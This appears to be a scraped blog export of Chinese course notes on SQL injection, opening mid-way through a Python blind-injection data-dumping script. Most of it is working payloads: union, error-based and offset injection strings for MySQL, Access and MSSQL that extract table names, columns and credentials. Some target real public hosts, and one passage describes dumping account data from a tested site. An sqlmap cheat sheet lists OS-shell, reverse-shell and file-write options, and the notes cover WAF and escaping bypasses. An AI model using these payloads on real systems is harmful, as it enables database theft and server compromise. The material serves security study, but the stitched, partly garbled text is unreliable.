1: midx = int((max + min) / 2) dump_data_payload = url + &quot; and ord(mid((select %s from %s.%s limit %d,1),%d,1))&gt;%d --+&quot; % ( i, db_name, tb_name, j, l, midx) # print(dump_data_payload) r = requests.get(dump_data_payload) if str in r.text: min = midx else: max = midx dump_data += chr(max) dump_data_list.append(dump_data) dump_data = &#x27;&#x27; # print( dump_data_list) print(&quot;[+]%s数据库的%s表的数据:&quot; % (db_name, tb_name)) j = 0 num_1 = len(dump_data_list) // data_num for i in range(data_num): j = i for k in range(num_1): print(&quot;%s\\t\\t&quot; % dump_data_list[j], end=&#x27;&#x27;) j = i + data_num print()def re(url, str, ascii_list, tb_name_list, db_name): while True: tb_name = input(&quot;如需跑其他表,请输入任意字符,否则输入No(例如 admin):&quot;) if tb_name == &#x27;NO&#x27; or tb_name == &#x27;No&#x27; or tb_name == &#x27;no&#x27;: break else: print(tb_name_list) column_name_list, tb_name = column_name(url, str, ascii_list, tb_name_list, db_name) dump_data(url, str, tb_name, db_name, column_name_list)url = input(&quot;请输入URL:&quot;) # 目标url http://127.0.0.1/sqli/Less-5/?id=1str = input(&quot;请输入正确页面返回字符串:&quot;) # 布尔型盲注的true&amp;false的判断因素 You are inurl = close(url)ascii_list = db_ascii_list()db_name = db_name(url, str, ascii_list)tb_name_list = tb_name(url, str, ascii_list, db_name)column_name_list, tb_name = column_name(url, str, ascii_list, tb_name_list, db_name)dump_data(url, str, tb_name, db_name, column_name_list)re(url, str, ascii_list, tb_name_list, db_name) 涉及资源12345https://www.jianshu.com/p/bc35f8dd4f7chttps://www.jianshu.com/p/fcae21926e5chttps://pan.baidu.com/s/1IX6emxDpvYrVZbQzJbHn3g 提取码：l9f6","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://al0nez.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"15WEB漏洞--SQL注入之Oracle、MongoDB注入","slug":"15WEB漏洞-SQL注入之Oracle、MongoDB注入","date":"2021-09-21T02:29:13.000Z","updated":"2021-09-21T06:05:24.391Z","comments":true,"path":"2021/09/21/15WEB漏洞-SQL注入之Oracle、MongoDB注入/","link":"","permalink":"https://al0nez.github.io/2021/09/21/15WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOracle%E3%80%81MongoDB%E6%B3%A8%E5%85%A5/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 数据库Access，mysql，mongoDB，postsql，sqlite，oracle，sybase等 mysql mssql等 123456数据库A 表名 列名 数据数据库B ........... Access 12345 表名 列名数据 access数据库没有数据库名，数据库会保存在网站源码下面，数据库是独立的，所以无法进行跨库注入，access没有向其他数据库一样的功能，没有文件读写的功能。 什么决定网站注入点用户权限？数据库配置文件的用户，是谁连接的 简要学习各种数据库的注入特点数据库架构组成，数据库高权限操作 Access注入正常情况下，access注入需要通过猜解表名和字段名去注入。 判断注入点123http://219.153.49.228:47744/new_list.asp?id=1&#x27; #页面报错http://219.153.49.228:47744/new_list.asp?id=1 and 1=1 #页面正常http://219.153.49.228:47744/new_list.asp?id=1 and 1=2 #页面报错 说明是数字型注入 判断是不是access数据库12若带入 and (select count(*) from msysobjects)&gt;0 由于msysobjects表在access数据库中无权访问所以返回错误--为access数据库 因为access数据库有时候添加上面的语句就报错，所以我们不知道是不是access数据库，这里我们根据脚本语言判断 如果语言为asp,基本就是access数据库，aspx可能是mssql很少是access。所以我们要判断是不是access数据库。只需要看是不是asp 语言，如果是aspx就判断他是不是MSSQL数据库即可。 1234#若带入and (select count(*) from sysobjects)&gt;0 #由于sysobjects表在MSSQL数据库中可以正常访问所以当返回正常页面时表示为MSSQL数据库http://219.153.49.228:43394/new_list.asp?id=1 and (select count(*) from sysobjects)&gt;0 #错误表示不是mssql,而是access、数据库 联合注入如果有回显的话可以用联合注入,无回显就用盲注 order by 语句判断列数 1http://219.153.49.228:47744/new_list.asp?id=1 order by 4 猜解表名因为我们已经知道字段数了，所以剩下的就是表名了，这个需要自己去猜，或者使用工具跑，正确就会返回回显的位置，错误就会报错 1http://219.153.49.228:43394/new_list.asp?id=1 union select 1,2,3,4 from admin(自己猜测的) 1http://219.153.49.228:43394/new_list.asp?id=1 and exists (select * from admin) #判断查询结果是否存在 猜解列名然后就是猜列名，一顿猜。。 1http://219.153.49.228:43394/new_list.asp?id=1 union select 1,username,passwd,4 from admin(自己猜测的) 也可以这样猜，盲注一般用这个，因为没有回显。 12http://219.153.49.228:43394/new_list.asp?id=1 and exists (select id from admin) #页面返回正常表示存在http://219.153.49.228:43394/new_list.asp?id=1 and exists (select id,username from admin) #页面返回正常表示存在 偏移注入偏移注入主要是针对知道表，但是不知道字段的。 这里我已经知道了表明是：sys_admin 可以使用： 1select exists(selct * from sys_admin); 来猜测是否有sys_admin表，如果说存在的话页面就会显示正常。 00x1 判断字段数 12http://www.test.com/newslist.asp?id=688 order by 19 #错误http://www.test.com/newslist.asp?id=688 order by 18 #正确 00x2 爆出显示位 1http://www.fdsp-reme.com/newslist.asp?id=688 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from sys_admin 00x3 判断表内存在的字段数 接下来我们利用“”代替admin表内存在的字段，由于是18个字段数，需要逐步测试，直到返回正常。这里”“也可以使用sys_admin.*代替 1234http://www.fdsp-reme.com/newslist.asp?id=688 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,* from sys_admin #错误http://www.fdsp-reme.com/newslist.asp?id=688 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from sys_admin #错误http://www.fdsp-reme.com/newslist.asp?id=688 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,* from sys_admin #错误直到.........http://www.test.com/newslist.asp?id=688 union select 1,2,3,4,5,6,7,8,9,10,11,* from sys_admin #正确 18-11=7，也就是说明sys_admin表有7个字段 偏移注入的基本公式为: ​ order by 出的字段数减去号的字段数，然而再用order by的字段数减去*2倍刚才得出来的答案 也就是18-11=7 18-7*2=4 得到答案等于：4 然后依旧是套公式的过程。 这里的id必须是存在的。也是就说必须要知道一个字段，所以要靠运气。 1234http://www.fdsp-reme.com/newslist.asp?id=688 union select 1,2,3,4,a.id,b.id,* from (sys_admin as a inner join sys_admin as b on a.id = b.id)#这里union select 1,2,3,4：顾名思义就是刚才得出来的长度。#后面的是sql，可作公式。 如此便爆出了账号密码。 但是我测试的这个网站，略微有点特殊。如下图所示 SQL server/MSSQL注入①判断数据库类型 12and exists (select * from sysobjects)--返回正常为mssql（也名sql server）and exists (select count(*) from sysobjects)--有时上面那个语句不行就试试这个哈 ②判断数据库版本 123and 1=@@version--这个语句要在有回显的模式下才可以哦and substring((select @@version),22,4)=&#x27;2008&#x27;--适用于无回显模式，后面的2008就是数据库版本，返回正常就是2008的复制代码第一条语句执行效果图（类似）：第二条语句执行效果图：（如果是2008的话就返回正常） ③获取所有数据库的个数 (一下3条语句可供选择使用) 1234561. and 1=(select quotename(count(name)) from master..sysdatabases)--2. and 1=(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases) --3. and 1=(select str(count and 1=(select quotename(count(name)) from master..sysdatabases where dbid&gt;5)-- and 1=(select str(count(name))%2b&#x27;|&#x27; from master..sysdatabases where dbid&gt;5) -- and 1=(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases where dbid&gt;5) --说明：dbid从1-4的数据库一般为系统数据库. ⑤获取数据库 （该语句是一次性获取全部数据库的，且语句只适合&gt;=2005，两条语句可供选择使用） 12and 1=(select quotename(name) from master..sysdatabases FOR XML PATH(&#x27;&#x27;))--and 1=(select &#x27;|&#x27;%2bname%2b&#x27;|&#x27; from master..sysdatabases FOR XML PATH(&#x27;&#x27;))-- ⑥获取当前数据库 12and db_name()&gt;0and 1=(select db_name())-- ⑦获取当前数据库中的表（有2个语句可供选择使用）【下列语句可一次爆数据库所有表（只限于mssql2005及以上版本）】 123and 1=(select quotename(name) from 数据库名..sysobjects where xtype=&#x27;U&#x27; FOR XML PATH(&#x27;&#x27;))-- and 1=(select &#x27;|&#x27;%2bname%2b&#x27;|&#x27; from 数据库名..sysobjects where xtype=&#x27;U&#x27; FOR XML PATH(&#x27;&#x27;))--复制代码测试效果图：得到 3个敏感的表：Whir_Sec_Users/Whir_Mem_Member/Whir_Mem_MemberGroup ⑧获得表里的列 123一次爆指定表的所有列（只限于mssql2005及以上版本）:and 1=(select quotename(name) from 数据库名..syscolumns where id =(select id from 数据库名..sysobjects where name=&#x27;指定表名&#x27;) FOR XML PATH(&#x27;&#x27;))-- and 1=(select &#x27;|&#x27;%2bname%2b&#x27;|&#x27; from 数据库名..syscolumns where id =(select id from 数据库名..sysobjects where name=&#x27;指定表名&#x27;) FOR XML PATH(&#x27;&#x27;))-- 效果图：既然有账户信息，我就不管是不是管理员的的了，我帖子的目的不是为了得到管理员的信息，只是为了演示可以通过这个方法来获取相关信息。 ⑨获取指定数据库中的表的列的数据库 123456789101112逐条爆指定表的所有字段的数据（只限于mssql2005及以上版本）:and 1=(select top 1 * from 指定数据库..指定表名 where排除条件 FOR XML PATH(&#x27;&#x27;))--一次性爆N条所有字段的数据（只限于mssql2005及以上版本）:and 1=(select top N * from 指定数据库..指定表名 FOR XML PATH(&#x27;&#x27;))--复制代码第一条语句：and 1=(select top 1 * from 指定数据库..指定表名 FOR XML PATH(&#x27;&#x27;))--测试效果图：----------------------------------加上where条件筛选结果出来会更加好，如：where and name like &#x27;%user%&#x27; 就会筛选出含有user关键词的出来。用在筛选表段时很不错。 注意：在使用一次获取数据库信息的语句时，请使用火狐浏览器，笔者测试 IE8、360急速浏览器、猎豹浏览器均卡死，火狐浏览器也会导致出现几秒钟的卡死，弹出框框，我们点击“停止脚本”就会得到初步解决。！！！！！！！！！！！！！！！！！！！！至此，我们已经得到了账户信息了，至于管理员的呢，哈哈，大家自行测试时换表啥的就好了。 PostgraSQL注入原理直接参考这个，没必要记住，能看懂就行 123https://www.webshell.cc/524.htmlhttps://www.cnblogs.com/yilishazi/p/14710349.htmlhttps://www.jianshu.com/p/ba0297da2c2e Oracle注入1https://www.cnblogs.com/peterpan0707007/p/8242119.html MongoDB注入12https://blog.csdn.net/weixin_33881753/article/details/87981552https://www.secpulse.com/archives/3278.html Sqlmapsqlmap支持的数据库MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB 参数12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576基本操作笔记：-u #注入点 -f #指纹判别数据库类型 -b #获取数据库版本信息 -p #指定可测试的参数(?page=1&amp;id=2 -p &quot;page,id&quot;) -D &quot;&quot; #指定数据库名 -T &quot;&quot; #指定表名 -C &quot;&quot; #指定字段 -s &quot;&quot; #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s &quot;xx.log&quot; 恢复:-s &quot;xx.log&quot; --resume) --level=(1-5) #要执行的测试水平等级，默认为1 --risk=(0-3) #测试执行的风险等级，默认为1 --time-sec=(2,5) #延迟响应，默认为5 --data #通过POST发送数据 --columns #列出字段 --current-user #获取当前用户名称 --current-db #获取当前数据库名称 --users #列数据库所有用户 --passwords #数据库用户所有密码 --privileges #查看用户权限(--privileges -U root) -U #指定数据库用户 --dbs #列出所有数据库 --tables -D &quot;&quot; #列出指定数据库中的表 --columns -T &quot;user&quot; -D &quot;mysql&quot; #列出mysql数据库中的user表的所有字段 --dump-all #列出所有数据库所有表 --exclude-sysdbs #只列出用户自己新建的数据库和表 --dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot; #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) --dump -T &quot;&quot; -D &quot;&quot; --start 2 --top 4 # 列出指定数据库的表的2-4字段的数据 --dbms #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) --os #指定系统(Linux,Windows) -v #详细的等级(0-6) 0：只显示Python的回溯，错误和关键消息。 1：显示信息和警告消息。 2：显示调试消息。 3：有效载荷注入。 4：显示HTTP请求。 5：显示HTTP响应头。 6：显示HTTP响应页面的内容--privileges #查看权限 --is-dba #是否是数据库管理员 --roles #枚举数据库用户角色 --udf-inject #导入用户自定义函数（获取系统权限） --union-check #是否支持union 注入 --union-cols #union 查询表记录 --union-test #union 语句测试 --union-use #采用union 注入 --union-tech orderby #union配合order by --data &quot;&quot; #POST方式提交数据(--data &quot;page=1&amp;id=2&quot;) --cookie &quot;用;号分开&quot; #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) --referer &quot;&quot; #使用referer欺骗(--referer &quot;http://www.baidu.com&quot;) --user-agent &quot;&quot; #自定义user-agent --proxy &quot;http://127.0.0.1:8118&quot; #代理注入 --string=&quot;&quot; #指定关键词,字符串匹配. --threads #采用多线程(--threads 3) --sql-shell #执行指定sql命令 --sql-query #执行指定的sql语句(--sql-query &quot;SELECT password FROM mysql.user WHERE user = &#x27;root&#x27; LIMIT 0, 1&quot; ) --file-read #读取指定文件 --file-write #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) --file-dest #要写入的文件绝对路径 --os-cmd=id #执行系统命令 --os-shell #系统交互shell --os-pwn #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) --msf-path= #matesploit绝对路径(--msf-path=/opt/framework/msf3/) --os-smbrelay # --os-bof # --reg-read #读取win系统注册表 --priv-esc # --time-sec= #延迟设置 默认--time-sec=5 为5秒 -p &quot;user-agent&quot; --user-agent &quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot; #指定user-agent注入 --eta #盲注 /pentest/database/sqlmap/txt/common-columns.txt 字段字典 common-outputs.txtcommon-tables.txt 表字典keywords.txtoracle-default-passwords.txtuser-agents.txtwordlist.txt 涉及资源123456789https://www.cnblogs.com/bmjoker/p/9326258.htmlhttps://github.com/youngyangyang04/NoSQLAttackhttps://github.com/sqlmapproject/sqlmap/zipball/masterhttps://blog.csdn.net/qq_39936434/category_9103379.htmlhttps://www.mozhe.cn/bug/WUJ3OGVQSTIyeXdvbHU2ZmV0MjVDUT09bW96aGUmozhe","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://al0nez.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"14WEB漏洞--SQL注入之类型及提交注入","slug":"14WEB漏洞-SQL注入之类型及提交注入","date":"2021-09-21T02:28:58.000Z","updated":"2021-09-21T06:05:28.280Z","comments":true,"path":"2021/09/21/14WEB漏洞-SQL注入之类型及提交注入/","link":"","permalink":"https://al0nez.github.io/2021/09/21/14WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 前言在真实 SQL 注入安全测试中，我们一定要先明确提交数据及提交方法后再进行注入，其中提交数据类型和提交方法可以通过抓包分析获取，后续安全测试中我们也必须满足同等的操作才能进行注入。 简要明确参数类型数字，字符，搜索，JSON 等 数字型 可以看到id=1，是数字型 字符型 email_id =&#39;Dumb@dhakkan.com&#39;我们必须用’或者’’包裹，否则会报错，因为他是字符型。 例如12345678$name = $_GET[&#x27;x&#x27;]$sql = &quot;select * from user where name = &#x27;$name&#x27;&quot;我们如果要注入就必须这样写?x=xiaodi&#x27; and 1=1 --+正确?x=xiaodi&#x27; and 1=1 --+错误带到数据库中$sql =&quot; select * from user where name = &#x27;xiaodi&#x27; and 1=1 --+&#x27;&quot; 正确$sql =&quot; select * from user where name = &#x27;xiaodi and 1=1 --+&#x27;&quot; 错误 干扰符号1一般是&#x27;,&quot;,%,),&#125; 12345678910id&#x27;id&#x27;&quot;id&quot;(&#x27;id&#x27;)(&quot;id&quot;)&quot;&#x27;id&#x27;&quot;(&quot;&#x27;id&#x27;&quot;)(&#x27;&quot;id&quot;&#x27;)&#x27;%id%&#x27;...... 简要明确请求方法1GET,POST,COOKIE,REQUEST,HTTP 头等 可以在network中查看 GET请求直接在浏览器后面添加参数就可以 1http://127.0.0.1/?id=1 POST请求1需要通过POST请求来写入参数 cookie12需要将cookie写入请求头中才可以传递cookie:c=xxxxx REQUEST请求 REQUEST 全部接收，网站在访问的时候由于我们大多数是黑盒测试，不知道对方代码写法，如果对方采用REQUEST接收方式，就不需要考虑用何种方法去提交，因为用GET、POST都可以。如果对方是单一接收方式，那么在注入的时候需要用它的方法去注入。 $_SERVER$_SERVER是PHP里内置变量，全局变量，PHP写脚本时用它来获取系统的值，在数据包的某一个地方可以进行注入 JSON注入相关知识JSON基础简介 JSON 是存储和交换文本信息的语法，是轻量级的文本数据交换格式。类似xml，但JSON 比 XML 更小、更快，更易解析。所以现在接口数据传输都采用json方式进行。JSON 文本的 MIME 类型是 “application/json” JSON语法 数据在名称/值对中 数据由逗号分隔 大括号保存对象 中括号保存数组 JSON值 数字（整数或浮点数） {“age”:30 } 字符串（在双引号中） {“uname”:”yang”} 逻辑值（true 或 false） {“flag”:true } 数组（在中括号中）{“sites”:[{“name”:”yang”},{“name”:”ming”}]} 对象（在大括号中）JSON 对象在大括号（{}）中书写： null { “runoob”:null } JSON代码格式 123456789101112131415161718192021&#123; &quot;users&quot;: &#123; &quot;user&quot;: [ &#123; &quot;id&quot;: &quot;1&quot;, &quot;username&quot;: &quot;admin&quot;, &quot;passwd&quot;: &quot;admin888&quot; &#125;, &#123; &quot;id&quot;: &quot;2&quot;, &quot;username&quot;: &quot;root&quot;, &quot;passwd&quot;: &quot;root123&quot; &#125;, &#123; &quot;id&quot;: &quot;3&quot;, &quot;username&quot;: &quot;system&quot;, &quot;passwd&quot;: &quot;system456&quot; &#125; ] &#125;&#125; JSON注入JSON注入是指应用程序所解析的JSON数据来源于不可信赖的数据源，程序没有对这些不可信赖的数据进行验证、过滤，如果应用程序使用未经验证的输入构造 JSON，则可以更改 JSON 数据的语义。在相对理想的情况下，攻击者可能会插入无关的元素，导致应用程序在解析 JSON数据时抛出异常。 演示案例：参数字符型注入测试less5单引号闭合 1http://127.0.0.1/sqli/Less-5/?id=3&#x27; order by 3 --+ less6双引号闭合 1http://127.0.0.1/sqli/Less-6/?id=3&quot; and 1=1--+ POST 数据提交注入测试less111uname=admin&#x27; and 1=2 #&amp;passwd=admin&amp;submit=Submit 1uname=admin&#x27; and 1=1 #&amp;passwd=admin&amp;submit=Submit  参数 JSON 数据注入测试=&gt;本地环境代码演示 COOKIE 数据提交注入测试需要先登录，然后进行cookie注入 123456789101112131415GET /sqli/Less-20/index.php HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://127.0.0.1/sqli/Less-20/Connection: closeCookie: uname=admi&#x27; union select 1,database(),3#; csrftoken=vKkecYAHNQy0hBzIqkW7oaJw91c8w1DPtQhCAWIXKPPgjuxTF3uii1r7lXPlDHeLUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: same-originSec-Fetch-User: ?1Cache-Control: max-age=0 HTTP 头部参数数据注入测试UA头注入 闭合掉前面的，使用报错注入 配合 sqlilabs 本地数据库演示1234567891011121314151617181920212223242526272829303132333435&lt;?phpheader(&#x27;content-type:text/html;charset=utf-8&#x27;);if(isset($_POST[&#x27;json&#x27;]))&#123;$json_str=$_POST[&#x27;json&#x27;];$json=json_decode($json_str);if(!$json)&#123;die(&#x27;JSON 文档格式有误，请检查&#x27;);&#125;$username=$json-&gt;username;//$passwd=$json-&gt;passwd;$mysqli=new mysqli();$mysqli-&gt;connect(&#x27;localhost&#x27;,&#x27;root&#x27;,&#x27;root&#x27;);if($mysqli-&gt;connect_errno)&#123;die(&#x27;数据库连接失败：&#x27;.$mysqli-&gt;connect_error);&#125;$mysqli-&gt;select_db(&#x27;security&#x27;);if($mysqli-&gt;errno)&#123;dir(&#x27;打开数据库失败：&#x27;.$mysqli-&gt;error);&#125;$mysqli-&gt;set_charset(&#x27;utf-8&#x27;);$sql=&quot;SELECT * FROM users WHERE username=&#x27;&#123;$username&#125;&#x27;&quot;;echo $sql;$result=$mysqli-&gt;query($sql);if(!$result)&#123;die(&#x27;执行 SQL 语句失败：&#x27;.$mysqli-&gt;error);&#125;else if($result-&gt;num_rows==0)&#123;die(&#x27;查询结果为空&#x27;);&#125;else &#123;$array1=$result-&gt;fetch_all(MYSQLI_ASSOC);echo &quot;用户名：&#123;$array1[0][&#x27;username&#x27;]&#125;,密码：&#123;$array1[0][&#x27;password&#x27;]&#125;&quot;;&#125;$result-&gt;free();$mysqli-&gt;close();&#125;?&gt;","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://al0nez.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"13WEB漏洞--SQL注入之MYSQL注入","slug":"13WEB漏洞-SQL注入之MYSQL注入","date":"2021-09-21T02:28:40.000Z","updated":"2021-09-21T06:05:32.290Z","comments":true,"path":"2021/09/21/13WEB漏洞-SQL注入之MYSQL注入/","link":"","permalink":"https://al0nez.github.io/2021/09/21/13WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 前言MYSQL 注入中首先要明确当前注入点权限，高权限注入时有更多的攻击手法，有的能直接进行 getshell 操作。其中也会遇到很多阻碍，相关防御方案也要明确，所谓知己知彼,百战不殆。不论作为攻击还是防御都需要了解其中的手法和原理，这样才是一个合格的安全工作者。 高权限注入检查权限1?id=-1 union select 1,user(),3 如果是root则为高权限，高权限用户可以跨库注入，普通用户只能注入自己的数据库。 权限在这里设置 跨库查询及应用思路information_schema 表特性，记录库名，表名，列名对应表 获取所有数据库名：1http://127.0.0.1/sqli/Less-2/?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata --+ 获取指定 pikachu数据库名下的表名信息：1http://127.0.0.1/sqli/Less-2/?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;pikachu&#x27; --+ 获取指定pikachu下的表名 users 下的列名信息：1http://127.0.0.1/sqli/Less-2/?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;pikachu&#x27; --+ 获取指定 pikachu下的 users 数据1http://127.0.0.1/sqli/Less-2/?id=-1 union select 1,group_concat(concat_ws(0x7e,username,password)),3 from pikachu.users--+ 文件读写操作12345load_file()：读取函数into outfile 或 into dumpfile ：导出函数select load_file(&#x27;D:\\\\phpStudy\\\\WWW\\\\sqli\\\\Less-7\\\\test.txt&#x27;);select &#x27;crow&#x27; into outfile &#x27;D:\\\\phpStudy\\\\WWW\\\\sqli\\\\Less-7\\\\test.txt&#x27;; 写入内容为crow 路径获取常见方法：报错显示，遗留文件，漏洞报错，平台配置文件，爆破等 windows一般路径:1d:/wwwroot/xiaodi8/ linux一般路径:1/var/www/xiaodi8 常见读取文件列表：常见写入文件问题：魔术引号开关 magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。 在magic_quotes_gpc=On的情况下，如果输入的数据有单引号（’）、双引号（”）、反斜线（）与 NUL（NULL 字符）等字符都会被加上反斜线。这些转义是必须的，如果这个选项为off，那么我们就必须调用addslashes这个函数来为字符串增加转义。 1magic_quotes_gpc 魔术引号及常见防护编码或宽字节绕过：比如在sqlmap中添加–temper脚本参数转码或者使用转换工具 addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。 预定义字符是： 单引号（’） 双引号（”） 反斜杠（\\） NULL 防护自带防御：魔术引号 内置函数：int、addslashes() 函数等 纯数字过滤饶过不了 关键字过滤 将select替换为fuck,这种可以通过大小写绕过。 WAF防护软件 安全狗、宝塔等 低版本注入配合读取或暴力字典或读取 涉及资源：1https://blog.csdn.net/weixin_30292843/article/details/99381669","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://al0nez.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"12WEB漏洞--SQL注入之简要SQL注入","slug":"12WEB漏洞-SQL注入之简要SQL注入","date":"2021-09-21T02:28:19.000Z","updated":"2021-09-21T06:05:36.536Z","comments":true,"path":"2021/09/21/12WEB漏洞-SQL注入之简要SQL注入/","link":"","permalink":"https://al0nez.github.io/2021/09/21/12WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 前言在本系列课程学习中，SQL 注入漏洞将是重点部分，其中 SQL 注入又非常复杂，区分各种数据库类型，提交方法，数据类型等注入，我们需要按部就班的学习，才能学会相关 SQL 注入的核心。同样此类漏洞是WEB 安全中严重的安全漏洞，学习如何利用，挖掘，修复也是很重要的。 SQL原理SQL注入是一种解释性语言，如果程序与用户进行交互。用户就可以构造特殊的输入来拼接到程序中执行，从而使得程序依据用户输入执行有可能存在恶意行为的代码。 SQL产生条件： 必须可以进行输入 输入的内容必须要与数据库进行交互 SQL注入的分类 从注入手法分类可以分为：联合查询注入、报错型注入、布尔型注入、延时注入、堆叠注入 从数据类型上可以分为：字符型（即输入的输入使用符号进行过滤）、数值型（即输入的输入未使用符号进行过滤） 从注入位置可以分类为：GET数据（提交数据方式为GET，大多存在地址栏）、POST数据（提交数据方式为POST，大多存在输入框中）、HTTP头部（提交数据方式为HTTP头部）、cookie数据（提交数据方式为cookie） SQL注入安全测试中危害 网站权限 数据库数据 MYSQL数据库注入顺序 12345678数据库A=网站A 表名 列名 数据数据库B=网站B.........数据库C=网站C.......... 如何判断注入点老办法12345678910111213and 1=1 页面正常and 1=2 页面错误可能存在注入点解释select * from users where id=1 and 1=1 limit 0,1 正常select * from users where id=1 and 1=2 limit 0,1 错误前提:select * from users where id=1若:1=1 真 真且真=真若:1=2 假 真且假=假不可以用or判断 好用的！！123456select * from users where id=1最后我们测试都是在id后面加东西,然后id带入数据库进行查询,所有我们这里可以随便输入,当数据库没有这个id,页面就会改变.例如:id=1西瓜,如果页面改变说明有注入,如果没有改变说明id本身没有被带入数据库中进行查询。例外:如果你输入错误网站会报404,,进行跳转.此类网站有防护,基本没有注入。 必要知识点1、information_chema 在Mysql 5.0以上的版本中，默认定义了information_schema数据库，用来存储数据库元信息，其中具有表schemata(数据库名),tables(表明),columns(列名或字段名) 在schemata表中，schema_name字段用来存储数据库名， 在tables表中，table_schema和table_name分别用来存储数据库名和表名。 在columns表中，table_schema(数据库名),table_name(表名),column_name(字段名) 2、数据库中的”.”数据库中符号”.”代表下一级，如xiao.user表示xiao数据库中的user表名 猜解列名数量猜解列名数量(字段数) order by x 错误与正常的正常值 1?id=1 order by 4 联合注入报错猜解准备 12?id=1 union select 1,2,3,4 页面正常说明猜解列名正确?id=-1 union select 1,2,3,4 通过将id=-1 使后面的语句执行成功,能够在页面中回显的位置将会被数字代替 信息收集1234567数据库版本: version()数据库名字: database()数据库用户: user()操作系统: @@version_compile_os查询:?id=-1 union select 1,database(),3,4 查询指定数据库名下的表名信息指定数据库:mozhe_Discus_StormGroup 1?id=-1 union select 1,table_name,3,4 from information_schema.tables where table_shchema=&#x27;mozhe_Discus_StormGroup&#x27; 这样查询只会显示一个需要group_concat() 1?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_shchema=&#x27;mozhe_Discus_StormGroup&#x27; 查询指定表名名下的列名信息指定表:StormGroup_member 1?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_shchema=&#x27;StormGroup_member&#x27; 查询指定数据这样只能查出一部分,或者只能查出一个 1?id=-1 union select 1,name,password,4 from mozhe_Discus_StormGroup.StormGroup_member 这样可以将全部信息查出,也可以使用limit 0,x进行多个查询 1?id=-1 union select 1,group_concat(concat_ws(0x7e,name,password)),3,4 from mozhe_Discus_StormGroup.StormGroup_member 